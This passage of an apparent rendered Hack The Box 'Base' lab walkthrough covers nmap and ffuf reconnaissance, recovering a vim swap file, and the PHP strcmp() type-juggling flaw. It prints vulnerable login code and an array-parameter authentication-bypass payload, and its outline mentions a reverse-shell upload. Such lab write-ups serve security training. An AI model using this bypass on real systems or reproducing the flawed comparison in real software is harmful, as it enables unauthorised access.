+      <a href="../../../THM/Insane/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insane
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Contribute
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Contribute
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../contributing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Contributing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TEMPLATE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Write-up template
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-machine-overview-metadata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Machine Overview &amp; Metadata
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Machine Overview &amp; Metadata">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-chain-at-a-glance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain at a Glance
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-reconnaissance-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Reconnaissance &amp; Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Reconnaissance &amp; Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-connectivity-check-variable-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Connectivity Check &amp; Variable Setup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-full-nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Full Nmap Scan
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-web-enumeration-first-look" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3 Web Enumeration — First Look
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24-directory-file-fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4 Directory &amp; File Fuzzing
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-source-code-review-vulnerability-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Source Code Review &amp; Vulnerability Discovery
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Source Code Review &amp; Vulnerability Discovery">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-recovering-the-source-from-the-swap-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.1 Recovering the Source from the Swap File
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-root-cause-strcmp-loose-comparison-type-juggling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3.2 Root Cause: strcmp() + Loose Comparison (Type Juggling)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-initial-foothold-user-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Initial Foothold (User Access)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Initial Foothold (User Access)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-crafting-the-authentication-bypass-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 Crafting the Authentication Bypass Request
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-from-admin-panel-to-rce-unrestricted-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 From Admin Panel to RCE — Unrestricted File Upload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-locating-the-upload-directory" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3 Locating the Upload Directory
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#44-catching-the-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.4 Catching the Shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#45-shell-upgrade-full-tty" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.5 Shell Upgrade — Full TTY
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#46-enumeration-as-www-data-credential-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.6 Enumeration as www-data &amp; Credential Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-privilege-escalation-root-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Privilege Escalation (Root Access)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Privilege Escalation (Root Access)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-systematic-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 Systematic Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-the-vector-sudo-on-usrbinfind" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 The Vector: sudo on /usr/bin/find
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#53-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.3 Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-remediation-security-hardening" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Remediation &amp; Security Hardening
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Remediation &amp; Security Hardening">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-sensitive-file-exposure-loginphpswp-directory-listing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.1 Sensitive File Exposure (login.php.swp, directory listing)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62-authentication-bypass-php-type-juggling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.2 Authentication Bypass (PHP type juggling)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63-unrestricted-file-upload-rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.3 Unrestricted File Upload → RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#64-credential-storage-reuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.4 Credential Storage &amp; Reuse
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#65-dangerous-sudo-rule" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.5 Dangerous sudo Rule
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#66-defense-in-depth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6.6 Defense-in-Depth
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-lessons-learned-attack-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Lessons Learned (Attack Summary)
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+  
+
+
+
+  
+  
+
+
+<h1 id="htb-base-full-walkthrough">HTB — Base | Full Walkthrough<a class="headerlink" href="#htb-base-full-walkthrough" title="Permanent link">&para;</a></h1>
+<div class="opfor-metabox">
+  <div><span class="meta-label">Platform</span><span class="meta-value">HTB</span></div>
+  <div><span class="meta-label">OS</span><span class="meta-value">Linux</span></div>
+  <div><span class="meta-label">Difficulty</span><span class="meta-value opfor-tag opfor-tag--easy">easy</span></div>
+  <div><span class="meta-label">Primary Vector</span><span class="meta-value opfor-tag opfor-tag--web">web</span></div>
+  <div><span class="meta-label">Rooted</span><span class="meta-value">Aug 2026</span></div>
+</div>
+
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p><strong>Scope note:</strong> The target IP changes every time the machine spawns. Every command below uses <code>$IP</code>, set once at the start of the engagement. All outputs shown were captured against <code>10.129.50.24</code>.</p>
+</div>
+<hr />
+<h2 id="1-machine-overview-metadata">1. Machine Overview &amp; Metadata<a class="headerlink" href="#1-machine-overview-metadata" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Machine</strong></td>
+<td>Base</td>
+</tr>
+<tr>
+<td><strong>Platform</strong></td>
+<td>Hack The Box (retired)</td>
+</tr>
+<tr>
+<td><strong>OS</strong></td>
+<td>Linux (Ubuntu 18.04.6 LTS, kernel 4.15.0-151-generic)</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>Attack Vector</strong></td>
+<td>Web</td>
+</tr>
+<tr>
+<td><strong>Key Vulnerabilities</strong></td>
+<td>Sensitive file exposure (<code>login.php.swp</code> left in webroot) • PHP <code>strcmp()</code> type juggling → authentication bypass • Unrestricted file upload → Remote Code Execution • Plaintext credential disclosure + password reuse • Unsafe <code>sudo</code> rule on <code>/usr/bin/find</code> → root</td>
+</tr>
+<tr>
+<td><strong>Author of notes</strong></td>
+<td>CPTS Field Manual</td>
+</tr>
+</tbody>
+</table>
+<h3 id="attack-chain-at-a-glance">Attack Chain at a Glance<a class="headerlink" href="#attack-chain-at-a-glance" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Nmap (22/ssh, 80/http)
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>   └─&gt; Directory fuzzing → /login/ has directory listing enabled
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>         └─&gt; login.php.swp exposed → recover login.php source
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>               └─&gt; strcmp($input, $secret) == 0 with LOOSE comparison
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>                     └─&gt; POST arrays (username[]=x&amp;password[]=x) → NULL == 0 → auth bypass
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>                           └─&gt; /upload.php admin panel → upload PHP reverse shell
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>                                 └─&gt; ffuf finds /_uploaded/ → trigger shell → www-data
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>                                       └─&gt; /var/www/html/login/config.php leaks creds
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>                                             └─&gt; password reuse → SSH as john → user.txt
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>                                                   └─&gt; sudo -l: (root) /usr/bin/find → GTFOBins → root.txt
+</code></pre></div>
+<hr />
+<h2 id="2-reconnaissance-enumeration">2. Reconnaissance &amp; Enumeration<a class="headerlink" href="#2-reconnaissance-enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="21-connectivity-check-variable-setup">2.1 Connectivity Check &amp; Variable Setup<a class="headerlink" href="#21-connectivity-check-variable-setup" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">IP</span><span class="o">=</span><span class="s2">"10.129.50.24"</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$IP</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>64 bytes from 10.129.50.24: icmp_seq=1 ttl=63 time=161 ms
+</code></pre></div>
+<p>A <code>ttl</code> of 63 (64 − 1 hop) hints at a Linux host one router away — consistent with an HTB Linux box.</p>
+<h3 id="22-full-nmap-scan">2.2 Full Nmap Scan<a class="headerlink" href="#22-full-nmap-scan" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sVC<span class="w"> </span>-A<span class="w"> </span>-Pn<span class="w"> </span>-T3<span class="w"> </span><span class="nv">$IP</span>
+</code></pre></div>
+<p><strong>Why each switch:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Switch</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-sV</code></td>
+<td>Probe open ports to fingerprint service <em>versions</em> (e.g., exact OpenSSH/Apache builds → tells us which exploit DBs to check).</td>
+</tr>
+<tr>
+<td><code>-sC</code></td>
+<td>Run the default NSE script set against discovered services (banner grabs, <code>http-title</code>, <code>ssh-hostkey</code>, etc.).</td>
+</tr>
+<tr>
+<td><code>-A</code></td>
+<td>Aggressive bundle: OS detection (<code>-O</code>), version detection (<code>-sV</code>), script scanning (<code>-sC</code>), and traceroute.</td>
+</tr>
+<tr>
+<td><code>-Pn</code></td>
+<td>Skip host discovery — assume the host is up (HTB boxes often drop ICMP/ARP probes from the NAT network; without this, Nmap may report "host down").</td>
+</tr>
+<tr>
+<td><code>-T3</code></td>
+<td>Default timing template. <code>-T4</code>/<code>-T5</code> are faster but noisier and can drop results on unstable links; <code>-T3</code> is reliable for a single-target lab.</td>
+</tr>
+<tr>
+<td><code>sudo</code></td>
+<td>Required for accurate OS detection and for <code>-sS</code>-style SYN behavior on raw sockets.</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="assets/01-nmap-scan.png" src="assets/01-nmap-scan.png" />
+<em>Full nmap scan of Base showing SSH on 22 and Apache on 80, with http-title "Welcome to Base"</em></p>
+<p><strong>Results:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>State</th>
+<th>Service</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (protocol 2.0)</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Apache httpd 2.4.29 ((Ubuntu)) — http-title: <em>Welcome to Base</em></td>
+</tr>
+</tbody>
+</table>
+<p>Only two TCP ports. No SSH brute-force surface yet (no credentials), so the web server on port 80 is the obvious entry point.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p><code>ssh-hostkey</code> output gives us the server's key fingerprints. Not directly useful now, but worth recording — it lets us detect MITM and confirm we always hit the same box.</p>
+</div>
+<h3 id="23-web-enumeration-first-look">2.3 Web Enumeration — First Look<a class="headerlink" href="#23-web-enumeration-first-look" title="Permanent link">&para;</a></h3>
+<p>Browsing to <code>http://$IP</code> shows a marketing site for a <strong>file hosting service</strong>:</p>
+<p><img alt="assets/02-landing-page.png" src="assets/02-landing-page.png" />
+<em>Base landing page — "The World's Number One File Hosting Service" with a Login button</em></p>
+<p>The navbar offers a <strong>Login</strong> link. Before touching it, enumerate the web root for anything the homepage doesn't advertise.</p>
+<h3 id="24-directory-file-fuzzing">2.4 Directory &amp; File Fuzzing<a class="headerlink" href="#24-directory-file-fuzzing" title="Permanent link">&para;</a></h3>
+<p>Using <code>ffuf</code> with a small, fast wordlist to map the application first:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">     </span>-u<span class="w"> </span>http://<span class="nv">$IP</span>/FUZZ<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">     </span>-t<span class="w"> </span><span class="m">100</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">     </span>-mc<span class="w"> </span>all<span class="w"> </span>-fc<span class="w"> </span><span class="m">404</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-w ...:FUZZ</code></td>
+<td>Wordlist aliased to the <code>FUZZ</code> keyword. <em>DirBuster 2.3-small (~87k entries)</em> is a good first pass — bigger lists (<code>raft-medium-directories</code>, <code>big.txt</code>) are the follow-up for deeper paths.</td>
+</tr>
+<tr>
+<td><code>-t 100</code></td>
+<td>100 concurrent threads — aggressive but acceptable against a single lab target.</td>
+</tr>
+<tr>
+<td><code>-mc all -fc 404</code></td>
+<td>Match every status code except 404, so redirects (302) and forbidden (403) paths surface too.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Found:</strong> <code>/login</code>, <code>/assets</code>, <code>/forms</code>.</p>
+<p>Visiting <code>/login/</code> is immediately interesting — <strong>Apache directory listing is enabled</strong>, so the index page dumps the folder contents:</p>
+<p><img alt="assets/03-login-directory-listing.png" src="assets/03-login-directory-listing.png" />
+<em>Index of /login — directory listing exposing config.php, login.php and login.php.swp</em></p>
+<p>Three files:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Size</th>
+<th>Significance</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>config.php</code></td>
+<td>61 B</td>
+<td>Almost certainly holds the credentials the login logic compares against. PHP is executed server-side, so requesting it directly returns nothing.</td>
+</tr>
+<tr>
+<td><code>login.php</code></td>
+<td>7.4K</td>
+<td>The login handler. Also executes server-side.</td>
+</tr>
+<tr>
+<td><code>login.php.swp</code></td>
+<td>16K</td>
+<td>⚠️ <strong>A vim swap file — editor backup garbage left in the webroot.</strong> Apache does <em>not</em> know how to execute <code>.swp</code>, so it serves the <strong>raw bytes</strong>, which contain the full source of <code>login.php</code>.</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>This is the actual first vulnerability of the box: <strong>sensitive file exposure via editor artifacts + directory listing</strong>. <code>.swp</code>, <code>.bak</code>, <code>.old</code>, <code>~</code> and <code>.save</code> files should always be part of your fuzzing wordlists (<code>DirBuster-2007_directory-list-2.3-small.txt</code> already includes common ones — and manual checks like <code>index.php.swp</code> are cheap).</p>
+</div>
+<hr />
+<h2 id="3-source-code-review-vulnerability-discovery">3. Source Code Review &amp; Vulnerability Discovery<a class="headerlink" href="#3-source-code-review-vulnerability-discovery" title="Permanent link">&para;</a></h2>
+<h3 id="31-recovering-the-source-from-the-swap-file">3.1 Recovering the Source from the Swap File<a class="headerlink" href="#31-recovering-the-source-from-the-swap-file" title="Permanent link">&para;</a></h3>
+<p>Download the swap file and recover the buffer. Two options:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Option A: quick strings dump</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://<span class="nv">$IP</span>/login/login.php.swp<span class="w"> </span>-o<span class="w"> </span>login.php.swp
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>strings<span class="w"> </span>login.php.swp<span class="w"> </span><span class="p">|</span><span class="w"> </span>less
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># Option B: proper vim recovery (preserves structure)</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>vim<span class="w"> </span>-r<span class="w"> </span>login.php.swp
+</code></pre></div>
+<p>Either way, the authentication logic of <code>login.php</code> comes back:</p>
+<p><img alt="assets/05-login-source-1.png" src="assets/05-login-source-1.png" />
+<em>Recovered login.php source — the strcmp() comparison logic visible in the swap file dump</em></p>
+<p><img alt="assets/04-login-source-2.png" src="assets/04-login-source-2.png" />
+<em>Second half of the recovered login.php source showing header redirect and session assignment</em></p>
+<p>Reconstructed (line order partially reassembled from the swap buffer — the <em>logic</em> is exact):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">session_start</span><span class="p">();</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>  <span class="c1">// both fields required</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    <span class="k">require</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>                                       <span class="c1">// pulls in $username / $password</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    <span class="k">if</span> <span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span> <span class="nv">$username</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>            <span class="c1">// (1) LOOSE comparison of strcmp() result</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>        <span class="k">if</span> <span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">],</span> <span class="nv">$password</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>        <span class="c1">// (2) same flaw on the password</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>            <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /upload.php"</span><span class="p">);</span>                     <span class="c1">// success → redirect to upload panel</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>                            <span class="c1">// marks the session as authenticated</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>            <span class="k">print</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('Wrong Username or Password')&lt;/script&gt;"</span><span class="p">);</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>        <span class="p">}</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>        <span class="k">print</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('Wrong Username or Password')&lt;/script&gt;"</span><span class="p">);</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>    <span class="p">}</span>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="p">}</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<h3 id="32-root-cause-strcmp-loose-comparison-type-juggling">3.2 Root Cause: <code>strcmp()</code> + Loose Comparison (Type Juggling)<a class="headerlink" href="#32-root-cause-strcmp-loose-comparison-type-juggling" title="Permanent link">&para;</a></h3>
+<p>Two design mistakes compound here:</p>
+<ol>
+<li>
+<p><strong><code>strcmp()</code> is being used for authentication at all.</strong> <code>strcmp()</code> compares <em>strings</em> byte-by-byte. Its return contract is: <code>&lt; 0</code> if str1 sorts before str2, <code>&gt; 0</code> if after, and <code>0</code> if they are <strong>equal</strong>.</p>
+</li>
+<li>
+<p><strong>The return value is checked with <code>==</code> (loose) instead of <code>===</code> (strict/identical).</strong> Loose comparison applies PHP's type juggling table. Critically:</p>
+</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>Expression</th>
+<th>Loose <code>==</code> result</th>
+<th>Strict <code>===</code> result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0 == "admin"</code></td>
+<td><code>true</code> (PHP &lt; 8)</td>
+<td><code>false</code></td>
+</tr>
+<tr>
+<td><code>NULL == 0</code></td>
+<td><code>true</code></td>
+<td><code>false</code></td>
+</tr>
+</tbody>
+</table>
+<p>Now the attack: <code>$_POST['username']</code> and <code>$_POST['password']</code> are <strong>attacker-controlled</strong>. HTTP has no types — if a client submits a field <strong>twice with square-bracket syntax</strong> (<code>username[]=x</code>), PHP dutifully converts it into an <strong>array</strong>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="x">$_POST['username'] = ['x'];   // an array, NOT a string</span>
+</code></pre></div>
+<p>Feed that array into <code>strcmp()</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x">strcmp(['x'], 'admin')</span>
+</code></pre></div>
+<p><code>strcmp()</code> expects two strings. On PHP 7 (Base runs PHP 7.2 on Ubuntu 18.04) it emits a <code>strcmp() expects parameter 1 to be string, array given</code> <strong>warning</strong> and returns <strong><code>NULL</code></strong>. On PHP 8+ this same trick throws a fatal <code>TypeError</code> — one reason this bug class mostly died with PHP 8 (still worth understanding: tons of PHP 5/7 code is in production).</p>
+<p>Then the loose comparison evaluates:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="x">if (NULL == 0)   // strcmp returned NULL; we compared with == </span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="x">// NULL == 0 → true  →  authentication PASSES</span>
+</code></pre></div>
+<div class="admonition important">
+<p class="admonition-title">Important</p>
+<p>The bug is <strong>not</strong> in <code>strcmp()</code> — it's the combination of (a) trusting user input to always be a string, and (b) checking the sentinel return value with <code>==</code> instead of <code>===</code>. <code>strcmp(...) === 0</code> would be safe here, because <code>NULL === 0</code> is <code>false</code>.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
